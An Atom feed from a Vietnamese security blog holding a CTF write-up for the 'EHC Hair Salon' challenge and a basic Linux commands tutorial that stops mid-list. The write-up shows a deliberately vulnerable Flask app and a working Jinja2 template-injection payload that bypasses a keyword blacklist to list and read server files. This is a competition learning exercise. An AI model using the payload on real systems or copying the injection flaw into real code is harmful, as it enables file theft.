<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-07-01T07:17:14+00:00</updated><id>/feed.xml</id><title type="html">phucdc‚Äôs Blog</title><entry><title type="html">FTPU Hacking CTF | Web Writeup | EHC Hair Salon</title><link href="/2022/06/29/FPTU-Hacking-CTF-EHC-Hair-Salon.html" rel="alternate" type="text/html" title="FTPU Hacking CTF | Web Writeup | EHC Hair Salon" /><published>2022-06-29T07:00:00+00:00</published><updated>2022-06-29T07:00:00+00:00</updated><id>/2022/06/29/FPTU-Hacking-CTF-EHC-Hair-Salon</id><content type="html" xml:base="/2022/06/29/FPTU-Hacking-CTF-EHC-Hair-Salon.html"><![CDATA[<h1 id="fptu-hacking-ctf-2022">FPTU Hacking CTF 2022</h1>

<h2 id="web-exploitation-ehc-hair-salon">Web exploitation: EHC Hair Salon</h2>

<blockquote>
  <p>Th·ª±c ra b√†i n√†y trong gi·∫£i th√¨ team K14LH c·ªßa t√¥i kh√¥ng c√≥ l√†m ƒë∆∞·ª£c v√¨ ‚Ä¶ Covid n√™n h∆°i o·∫£i (Ôºç_Ôºç) zzZ</p>
</blockquote>

<h3 id="-source-code">üßæ Source code</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">regex</span> <span class="o">=</span> <span class="s">"request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|</span><span class="se">\"</span><span class="s">|</span><span class="se">\'</span><span class="s">|</span><span class="se">\\</span><span class="s">|\~|\%|\#"</span>

<span class="n">error_page</span> <span class="o">=</span> <span class="s">'''
        {% extends "layout.html" %}
        {% block body %}
        &lt;center&gt;
           &lt;section class="section"&gt;
              &lt;div class="container"&gt;
                 &lt;h1 class="title"&gt;√îng ch√°u √†!&lt;/h1&gt;
                 &lt;p&gt;√îng ch√∫ ch·ªâ c·∫Øt ƒë∆∞·ª£c qu·∫£ ƒë·∫ßu Tommy Xiaomi th√¥i!&lt;/p&gt;
              &lt;/div&gt;
           &lt;/section&gt;
        &lt;/center&gt;
        {% endblock %}
        '''</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'hair'</span><span class="p">]:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">error_page</span><span class="p">)</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">error_page</span><span class="p">)</span>

        <span class="n">hair_type</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'hair'</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span>
        <span class="k">if</span> <span class="s">'{'</span> <span class="ow">in</span> <span class="n">hair_type</span> <span class="ow">and</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span><span class="n">hair_type</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">error_page</span><span class="p">)</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">hair_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">error_page</span><span class="p">)</span>

        <span class="n">page</span> <span class="o">=</span> \
            <span class="s">'''
        {{% extends "layout.html" %}}
        {{% block body %}}
        &lt;center&gt;
           &lt;section class="section"&gt;
              &lt;div class="container"&gt;
                 &lt;h1 class="title"&gt;D·∫≠y ƒëi √¥ng ch√°u ∆°i, c·∫Øt xong r·ªìi nh√©!&lt;/h1&gt;
                 &lt;ul class=flashes&gt;
                    &lt;label&gt;√îng ch√°u c√≥ qu·∫£ ƒë·∫ßu {} thanh to√°n ti·ªÅn cho ch√∫ n√†o &lt;3&lt;/label&gt;
                 &lt;/ul&gt;
                 &lt;/br&gt;
              &lt;/div&gt;
           &lt;/section&gt;
           &lt;iframe width="560" height="315" src="https://v16m-webapp.tiktokcdn-us.com/2f678d478e2de26a048aaf4f3ed6d8bd/62b6f7f3/video/tos/useast2a/tos-useast2a-pve-0037-aiso/dd6e434a38e4447e83f61a684c31583b/?a=1988&amp;ch=0&amp;cr=0&amp;dr=0&amp;lr=tiktok&amp;cd=0%7C0%7C0%7C0&amp;br=1302&amp;bt=651&amp;cs=0&amp;ds=1&amp;ft=ebtHKHk_Myq8Z4IeUwe2NsE~fl7Gb&amp;mime_type=video_mp4&amp;qs=0&amp;rc=ZThoZWk7Zzw3PGQ1NmVnM0BpM3VsZWg6ZjhzZDMzZjgzM0AzLjIyYC8tX2AxYGFhMjVhYSNnMS9kcjQwMC1gLS1kL2Nzcw%3D%3D&amp;l=202206250556040100040040250040050060030180F0D3C2C" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
      &lt;/iframe&gt;
        &lt;/center&gt;
        {{% endblock %}}
        '''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hair_type</span><span class="p">)</span>

    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
        <span class="n">page</span> <span class="o">=</span> \
            <span class="s">'''
        {% extends "layout.html" %}
        {% block body %}
        &lt;center&gt;
            &lt;section class="section"&gt;
              &lt;div class="container"&gt;
                 &lt;h1 class="title"&gt;Ch√†o m·ª´ng ƒë·∫øn v·ªõi &lt;a href="https://www.facebook.com/ehc.fptu"&gt;EHC Hair Salon&lt;/a&gt;, h√¥m nay √¥ng ch√°u n√†y mu·ªën c·∫Øt qu·∫£ ƒë·∫ßu n√†o nh·ªÉ?&lt;/h1&gt;
                 &lt;p&gt;Nh·∫≠p t√™n qu·∫£ ƒë·∫ßu m√† √¥ng ch√°u mu·ªën c·∫Øt nha!&lt;/p&gt;
                 &lt;form action='/' method='POST' align='center'&gt;
                    &lt;p&gt;&lt;input name='hair' style='text-align: center;' type='text' placeholder='Tommy Xiaomi' /&gt;&lt;/p&gt;
                    &lt;p&gt;&lt;input value='Submit' style='text-align: center;' type='submit' /&gt;&lt;/p&gt;
                 &lt;/form&gt;
              &lt;/div&gt;
           &lt;/section&gt;
        &lt;/center&gt;
        {% endblock %}
        '''</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>

<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="-analysis">üîé Analysis</h3>

<p>Th·ª© nh·∫•t, ta bi·∫øt ƒë√¢y l√† m·ªôt SSTI challenge th√¥ng qua d√≤ng 37-55.</p>

<p>Blacklist t·∫°i d√≤ng 5.</p>

<p>T·ª´ d√≤ng 23-35, ta bi·∫øt l√† ngo√†i vi·ªác ph·∫£i bypass ƒë∆∞·ª£c blacklist, payload c·ªßa ch√∫ng ta c√≤n ph·∫£i &lt;= 256 k√≠ t·ª±.</p>

<p>Th√¥ng qua b√†i vi·∫øt <a href="https://chowdera.com/2020/12/20201221231521371q.html">n√†y</a>, t√¥i bi·∫øt ƒë·∫øn <code class="language-plaintext highlighter-rouge">lipsum</code>, m·ªôt fuction gen ra ƒëo·∫°n vƒÉn m·∫´u huy·ªÅn tho·∫°i c·ªßa HTML: <strong><em>‚ÄúLorem ipsum‚Äù</em></strong></p>

<p><img src="https://i.imgur.com/lNiclIJ.png" alt="" /></p>

<p>May l√† kh√¥ng filter <code class="language-plaintext highlighter-rouge">_</code>, n√™n ch√∫ng ta ho√†n to√†n c√≥ th·ªÉ g·ªçi m·ªôt s·ªë t·ª´ kho√° nh∆∞ <code class="language-plaintext highlighter-rouge">__globals__</code> hay <code class="language-plaintext highlighter-rouge">__builtins__</code>:</p>

<p><img src="https://i.imgur.com/SrPkQea.png" alt="" /></p>

<p>T√¥i ƒë·ªÉ √Ω ƒë·∫øn <code class="language-plaintext highlighter-rouge">os</code>, ta c√≥ th·ªÉ g·ªçi module n√†y cho vi·ªác list file (v√¨ hi·ªán t·∫°i c≈©ng ch∆∞a bi·∫øt file flag n·∫±m ·ªü ƒë√¢u, t√™n g√¨):</p>

<p><img src="https://i.imgur.com/sva6jHW.png" alt="" /></p>

<p>Trong list tr·∫£ v·ªÅ l·∫°i th·∫•y c√≥ file <code class="language-plaintext highlighter-rouge">flag</code>, ƒë√£ v·∫≠y c√≤n v·ª´a hay n·∫±m ·ªü cu·ªëi list, s·ª≠ d·ª•ng h√†m <code class="language-plaintext highlighter-rouge">pop()</code> ƒë·ªÉ l·∫•y ph·∫ßn t·ª≠ cu·ªëi n√†y:</p>

<p><img src="https://i.imgur.com/5TtMMTY.png" alt="" /></p>

<p>Quay l·∫°i c√°i l√∫c th·ª≠ <code class="language-plaintext highlighter-rouge">lipsum.__globals__</code>, t√¥i th·∫•y c√≥ <code class="language-plaintext highlighter-rouge">open</code>, ban ƒë·∫ßu t√≠nh d√πng n√≥ ƒë·ªÉ g·ªçi flag, nh∆∞ng khi g·ªçi <code class="language-plaintext highlighter-rouge">lipsum.__globals__.open</code> th√¨ c√≥ v·∫ª nh∆∞ kh√¥ng ƒë∆∞·ª£c nh∆∞ mong mu·ªën:</p>

<p><img src="https://i.imgur.com/S56heXc.png" alt="" /></p>

<p>ƒê√†nh t√¨m payload kh√°c v·∫≠y, c√≥ m·ªôt function kh√°c, gi·ªëng v·ªõi <code class="language-plaintext highlighter-rouge">lipsum</code>, c≈©ng ƒëi k√®m v·ªõi Jinja2, <code class="language-plaintext highlighter-rouge">get_flashed_messages</code>:</p>

<p><img src="https://i.imgur.com/l7zBVX5.png" alt="" /></p>

<p>Ch√∫ng ta c√≥ th·ªÉ g·ªçi h√†m <code class="language-plaintext highlighter-rouge">open</code> th√¥ng qua <code class="language-plaintext highlighter-rouge">get_flashed_messages</code> nh∆∞ sau:</p>

<p><img src="https://i.imgur.com/X8SlCdM.png" alt="" /></p>

<p>Nh∆∞ v·∫≠y, ta c√≥ payload cu·ªëi c√πng:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">().</span><span class="n">pop</span><span class="p">()).</span><span class="n">readline</span><span class="p">()</span> <span class="p">}}</span>
</code></pre></div></div>

<p><img src="https://i.imgur.com/qGGMt9P.png" alt="" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">FPTUHacking{d4y_d1_0ng_ch4u_0i,ban_da_thoat_khoi_EHC_hair_salon_roi}</code></p>

<blockquote>
  <p>H∆°i ti·∫øc, v√¨ ch·ªâ m·∫•t 30p l√† l√†m ra b√†i n√†y r·ªìi, m√† h√¥m gi·∫£i ƒëang di·ªÖn ra th√¨ c·∫£ team l·∫°i o·∫£i v√¨ Covid qu√° n√™n ƒëi ng·ªß h·∫øt c·∫£ (Ô∏∂Ô∏πÔ∏∫)
C·∫£m ∆°n 0ni0n team v√¨ d√π c√≥ ch√∫t s·ª± c·ªë trong qu√° tr√¨nh deploy v√† ph·∫£i code v·ªôi challenge, nh∆∞ng ra ƒë∆∞·ª£c nh·ªØng ƒë·ªÅ ch·∫•t l∆∞·ª£ng. Shout out to 0ni0n!</p>
</blockquote>]]></content><author><name></name></author><summary type="html"><![CDATA[FPTU Hacking CTF 2022]]></summary></entry><entry><title type="html">Linux Basic Commands</title><link href="/2022/02/03/basic-linux-commands.html" rel="alternate" type="text/html" title="Linux Basic Commands" /><published>2022-02-03T13:00:00+00:00</published><updated>2022-02-03T13:00:00+00:00</updated><id>/2022/02/03/basic-linux-commands</id><content type="html" xml:base="/2022/02/03/basic-linux-commands.html"><![CDATA[<h1 id="basic-linux-commands">Basic linux commands</h1>

<h2 id="pwd">pwd</h2>

<p>C√°i n√†y t∆∞∆°ng ƒë∆∞∆°ng v·ªõi <code class="language-plaintext highlighter-rouge">echo $PWD</code>, hi·ªÉn th·ªã working-dir hi·ªán t·∫°i:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153142051-48d5d926-4684-49f1-b462-fb63ade4f2e9.png" alt="image" /></p>

<h2 id="ls">ls</h2>

<p>ƒê∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ list c√°c file v√† th∆∞ m·ª•c con t·∫°i ƒë∆∞·ªùng d·∫´n (path) cho tr∆∞·ªõc.</p>

<h3 id="1-syntax">1. Syntax:</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> &lt;options&gt; &lt;path&gt;
</code></pre></div></div>

<h3 id="2-example">2. Example:</h3>

<p>Khi kh√¥ng ƒë∆∞·ª£c cung c·∫•p path, <code class="language-plaintext highlighter-rouge">ls</code> s·∫Ω s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">$PWD</code> l√†m path:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153116545-99fdb6a5-ba48-40c0-a0cc-67d3beadb8ce.png" alt="image" /></p>

<ul>
  <li>
    <p>M·ªôt s·ªë nh·ªØng options hay d√πng:</p>

    <ul>
      <li>
        <p><code class="language-plaintext highlighter-rouge">-R</code>: recursive listing, list to√†n b·ªô c√°c file v√† th∆∞ m·ª•c con (t·∫•t c·∫£, k·ªÉ c·∫£ b√™n trong c√°c th∆∞ m·ª•c con):</p>

        <p><img src="https://user-images.githubusercontent.com/82533607/153116842-1da85ab6-ba81-40c3-bd7c-ae8555c71481.png" alt="image" /></p>
      </li>
      <li>
        <p><code class="language-plaintext highlighter-rouge">-l</code>: long list format, output ƒë∆∞a ra th√™m c√°c tr∆∞·ªùng kh√°c nh∆∞ ph√¢n quy·ªÅn, size, ‚Ä¶:</p>

        <p><img src="https://user-images.githubusercontent.com/82533607/153140269-0a7671b9-925f-404c-ab8d-ea294cb1ee5e.png" alt="image" /></p>
      </li>
      <li>
        <p><code class="language-plaintext highlighter-rouge">-a</code>: show all, hi·ªÉn th·ªã t·∫•t c·∫£ (k·ªÉ c·∫£ nh·ªØng th∆∞ m·ª•c hay file b·ªã ·∫©n b·∫±ng d·∫•u <code class="language-plaintext highlighter-rouge">.</code> ·ªü ƒë·∫ßu):</p>

        <p><img src="https://user-images.githubusercontent.com/82533607/153140526-0dc6bd90-efb3-493a-aef6-5f06ea3d3869.png" alt="image" /></p>
      </li>
    </ul>
  </li>
  <li>
    <p>M·ªôt s·ªë c√°ch bi·ªÉu di·ªÖn path:</p>

    <ul>
      <li>Full path: <code class="language-plaintext highlighter-rouge">/home/user/a/</code></li>
      <li>Relative path: <code class="language-plaintext highlighter-rouge">~/</code> (th∆∞ m·ª•c home c·ªßa user hi·ªán t·∫°i), <code class="language-plaintext highlighter-rouge">../</code> (th∆∞ m·ª•c cha), <code class="language-plaintext highlighter-rouge">./</code> (th∆∞ m·ª•c hi·ªán t·∫°i)</li>
    </ul>
  </li>
</ul>

<h2 id="cd">cd</h2>

<p>Chuy·ªÉn working dir ƒë·∫øn m·ªôt path kh√°c.</p>

<h3 id="1-syntax-1">1. Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> &lt;path&gt;
</code></pre></div></div>

<h3 id="2-example-1">2. Example</h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">cd</code> s·∫Ω chuy·ªÉn ƒë·∫øn th∆∞ m·ª•c home c·ªßa user hi·ªán t·∫°i, t∆∞∆°ng t·ª± <code class="language-plaintext highlighter-rouge">cd ~</code> v√† <code class="language-plaintext highlighter-rouge">cd &lt;full path to home&gt;</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153141274-ccdc019f-f247-4160-80a6-2e2a9962f032.png" alt="image" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">cd &lt;path&gt;</code> s·∫Ω chuy·ªÉn ƒë·∫øn th∆∞ m·ª•c ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153141791-0459968f-d34b-4e86-8462-416836c01e74.png" alt="image" /></p>

<h2 id="mkdir">mkdir</h2>

<p>T·∫°o th∆∞ m·ª•c, ƒë∆°n gi·∫£n v·∫≠y th√¥i</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153144543-2279c0bb-29e6-49a6-80c3-5cbddc5844a0.png" alt="image" /></p>

<h2 id="touch">touch</h2>

<p>T·∫°o file tr·ªëng</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153144763-880e3597-f273-4c77-8fb3-417fb2a5da96.png" alt="image" /></p>

<h2 id="file">file</h2>

<p>Ki·ªÉm tra file type:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153145295-3ed4bd16-10e1-472e-8f5e-084487a1385a.png" alt="image" /></p>

<h2 id="find">find</h2>

<p>T√¨m file/folder trong m·ªôt path nh·∫•t ƒë·ªãnh, v√≠ d·ª• nh∆∞ t√¨m file <code class="language-plaintext highlighter-rouge">flag.txt</code> trong th∆∞ m·ª•c <code class="language-plaintext highlighter-rouge">/etc</code> ch·∫≥ng h·∫°n &lt;(‚Äú)</p>

<h3 id="1-syntax-2">1. Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find &lt;path&gt; &lt;options&gt; 
</code></pre></div></div>

<h3 id="2-example-2">2. Example</h3>

<p>T√¨m file v·ªõi t√™n l√† test, xu·∫•t ph√°t t·ª´ th∆∞ m·ª•c g·ªëc</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="nb">test</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/153150347-20ebae47-1266-40b2-9ff4-9de46f0d7c3e.png" alt="image" /></p>

<p>T√¨m file v·ªõi quy·ªÅn x√°c ƒë·ªãnh trong working directory hi·ªán t·∫°i:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find ./ <span class="nt">-type</span> f <span class="nt">-perm</span> 777
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/153156450-233761ab-3979-4cbd-9949-f2fe95ec46ef.png" alt="image" /></p>

<p>Option <code class="language-plaintext highlighter-rouge">-type</code> c√≤n c√≥ th·ªÉ s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">-type d</code> ƒë·ªÉ t√¨m folder:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find ./ <span class="nt">-type</span> d <span class="nt">-name</span> <span class="nb">test</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/153156837-0bc352b7-de57-439f-a16b-df4d9d425a06.png" alt="image" /></p>

<h2 id="cat">cat</h2>

<p>ƒê·ªçc to√†n b·ªô n·ªôi dung c·ªßa file, k·ªÉ c·∫£ nh·ªØng k√≠ t·ª± con ng∆∞·ªùi kh√¥ng ƒë·ªçc ƒë∆∞·ª£c:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153157472-82ca50eb-7676-4fe7-ae54-2fb0cb0c2a3d.png" alt="image" /></p>

<h2 id="strings">strings</h2>

<p>Kh√°c v·ªõi <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">strings</code> ƒë·ªçc n·ªôi dung file con ng∆∞·ªùi c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153157832-f15d60d6-530d-41de-a111-683e9698c7c2.png" alt="image" /></p>

<h2 id="cp">cp</h2>

<p>Copy file ho·∫∑c folder ƒë·∫øn m·ªôt path kh√°c</p>

<h3 id="1-syntax-3">1. Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> &lt;options&gt; &lt;path_to_target&gt; &lt;path_to_destination&gt;
</code></pre></div></div>

<h3 id="example">Example</h3>

<p>Copy file test v√†o folder test_folder:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153159481-bbcc6526-cc02-4e6f-b7b0-dba81c6c800f.png" alt="image" /></p>

<p>Copy th∆∞ m·ª•c th√¨ c·∫ßn option <code class="language-plaintext highlighter-rouge">-r</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153159891-772ae28c-b080-41b4-824a-e836b357310f.png" alt="image" /></p>

<h2 id="mv">mv</h2>

<p>Move file ho·∫∑c folder ƒë·∫øn m·ªôt path kh√°c</p>

<h3 id="1-syntax-4">1. Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv</span> &lt;option&gt; &lt;path_to_target&gt; &lt;path_to_destination&gt;
</code></pre></div></div>

<h3 id="2-example-3">2. Example</h3>

<p>Move file <code class="language-plaintext highlighter-rouge">a.txt</code> sang folder <code class="language-plaintext highlighter-rouge">test</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153161045-ddbe081b-d8ac-497a-b4b2-2515dd6527fd.png" alt="image" /></p>

<p>Move folder <code class="language-plaintext highlighter-rouge">target</code> sang folder <code class="language-plaintext highlighter-rouge">test</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153161257-be54d406-f584-46b5-8978-87e070035337.png" alt="image" /></p>

<h2 id="rm">rm</h2>

<p>Nh∆∞ c√°i t√™n, <code class="language-plaintext highlighter-rouge">rm</code> ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ xo√° file ho·∫∑c folder</p>

<h3 id="syntax">Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> &lt;options&gt; &lt;path_to_target&gt;
</code></pre></div></div>

<h3 id="example-1">Example</h3>

<p>Ta th∆∞·ªùng s·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-f</code> ƒë·ªÉ b·∫Øt bu·ªôc xo√°, tr√°nh tr∆∞·ªùng h·ª£p nh∆∞ th·∫ø n√†y:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153171719-5a25578c-358b-4c95-ac38-bf497ff48626.png" alt="image" /></p>

<p>S·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-r</code> ƒë·ªÉ xo√° folder:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153171911-4d4c3af0-559e-4fd2-a734-22f6a0959679.png" alt="image" /></p>

<h2 id="wget">wget</h2>

<p>S·ª≠ d·ª•ng nh·∫±m l·∫•y d·ªØ li·ªáu v·ªÅ, c√≥ th·ªÉ s·ª≠ d·ª•ng v·ªõi c√°c giao th·ª©c <a href="https://www.comptia.org/content/guides/what-is-a-network-protocol">protocol</a> nh∆∞ HTTP, HTTPS, FTP, SFTP.</p>

<h3 id="syntax-1">Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget &lt;options&gt; &lt;url&gt;
</code></pre></div></div>

<h3 id="example-2">Example</h3>

<p>ƒê∆°n gi·∫£n nh·∫•t, <code class="language-plaintext highlighter-rouge">wget</code> 1 file v·ªÅ, <code class="language-plaintext highlighter-rouge">wget</code> s·∫Ω t·ª± ƒë·ªông l∆∞u file ·ªü working dir hi·ªán t·∫°i</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153166128-0b2d8028-6104-43e0-b59e-eb0443b16e13.png" alt="image" /></p>

<p>ƒê·ªÉ t·∫£i c√πng m·ªôt l√∫c nhi·ªÅu URL, t·∫°o 1 file text ch·ª©a c√°c URL v√† <code class="language-plaintext highlighter-rouge">wget</code> v·ªõi option <code class="language-plaintext highlighter-rouge">-i &lt;url_file&gt;</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153166733-8ed52b98-6886-4c87-86bb-c82b47fabae2.png" alt="image" /></p>

<p>ƒê·ªÉ l∆∞u file t·∫£i v·ªÅ t·∫°i m·ªôt th∆∞ m·ª•c n√†o ƒë√≥, s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">-P &lt;path&gt;</code> (t√™n file v·∫´n gi·ªØ nguy√™n):</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153167345-ccdf3b81-7e14-4724-8dbd-c42821f82aad.png" alt="image" /></p>

<p>ƒê·ªÉ l∆∞u file v·ªõi c√°i t√™n kh√°c, s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">-O &lt;newname&gt;</code> (c√°i n√†y c√≥ th·ªÉ thay ƒë·ªïi c·∫£ path nh∆∞ v√≠ d·ª• d∆∞·ªõi):</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153167739-983cdef9-e02b-4dfb-92d7-9e7fb9ab4e4d.png" alt="image" /></p>

<h2 id="curl">curl</h2>

<p>M·ªôt c√¥ng c·ª• c·ª±c h·ªØu hi·ªáu khi bi·∫øt c√°ch s·ª≠ d·ª•ng, c≈©ng t∆∞∆°ng t·ª± nh∆∞ <code class="language-plaintext highlighter-rouge">wget</code>, nh∆∞ng cURL c√≤n l√†m ƒë∆∞·ª£c nhi·ªÅu th·ª© h∆°n th·∫ø, nh∆∞ l√† g·ª≠i c√°c request header v·ªõi c√°c method kh√°c nhau.</p>

<p>cURL c√≥ th·ªÉ h·ªó tr·ª£ c√°c giao th·ª©c sau: HTTP, HTTPS, IMAP, IMAPS, SMB, MBS, SFTP, GOPHER, LDAP, LDAPS, SCP, FTP, FTPS, TELNET, POP3, POP3S, SMTP, SMTPS.</p>

<h3 id="syntax-2">Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="o">[</span>options] <span class="o">[</span>url]
</code></pre></div></div>

<h3 id="example-3">Example</h3>

<ul>
  <li>S·ª≠ d·ª•ng cURL ƒë·ªÉ t·∫£i file v·ªõi option <code class="language-plaintext highlighter-rouge">-o</code>:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-o</span> &lt;path/filename&gt; &lt;url&gt;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/153532532-ada6ec1b-e02a-49fd-aae8-cb83ed4bccf1.png" alt="image" /></p>

<ul>
  <li>Ho·∫∑c t·∫£i nhi·ªÅu file c√πng 1 l√∫c v·ªõi <code class="language-plaintext highlighter-rouge">-O</code>:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-O</span> <span class="o">[</span>URL1] ... <span class="nt">-O</span> <span class="o">[</span>URLn]
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/153532685-a2d29ee1-833e-4283-b94a-2b427dfab0b0.png" alt="image" /></p>

<ul>
  <li>Ngo√†i ra, khi ƒëang t·∫£i file t·ª´ m·ªôt URL n√†o ƒë√≥ nh∆∞ng b·ªã gi√°n ƒëo·∫°n (Ctrl C ho·∫∑c l·ª° tay t·∫Øt terminal), th√¨ c√≥ th·ªÉ ti·∫øp t·ª•c v·ªõi <code class="language-plaintext highlighter-rouge">-C -</code>:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-C</span> - <span class="nt">-O</span> <span class="o">[</span>URL]
</code></pre></div></div>

<ul>
  <li>
    <p>S·ª≠ d·ª•ng cURL ƒë·ªÉ g·ª≠i c√°c requests:</p>

    <ul>
      <li>S·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-X</code> ƒë·ªÉ x√°c ƒë·ªãnh method c·ª• th·ªÉ:</li>
    </ul>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> <span class="o">[</span>GET/PUT/POST/DELETE/....] <span class="o">[</span>URL]
</code></pre></div>    </div>

    <ul>
      <li>S·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-H</code> ƒë·ªÉ th√™m c√°c header c·ª• th·ªÉ:</li>
    </ul>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="o">[</span>header1] ... <span class="nt">-H</span> <span class="o">[</span>header n] <span class="o">[</span>URL]
</code></pre></div>    </div>

    <ul>
